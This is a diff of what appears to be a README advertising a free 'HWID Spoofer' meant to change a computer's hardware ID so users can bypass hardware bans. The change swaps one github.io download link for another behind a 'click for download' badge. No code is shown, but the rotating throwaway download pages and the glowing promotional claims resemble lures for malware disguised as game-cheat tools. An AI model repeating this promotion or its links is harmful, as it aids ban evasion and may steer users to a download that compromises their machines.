@@ -3,7 +3,7 @@
 HWID Spoofer Free is a trustworthy and user-friendly tool designed to change your hardware ID quickly and securely without any cost. It is ideal for gamers and software users looking to bypass hardware bans and protect their device identity. This free version ensures fast spoofing with minimal system impact and regular updates for continuous protection.
 
 <div style="text-align: center">
-  <a href="https://hwid-spoofer-22025.github.io/.github/">
+  <a href="https://hwid-spoofer-download-pc.github.io/.github/">
     <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-HWID_Spoofer_Free-blueviolet">
   </a>
 </div>
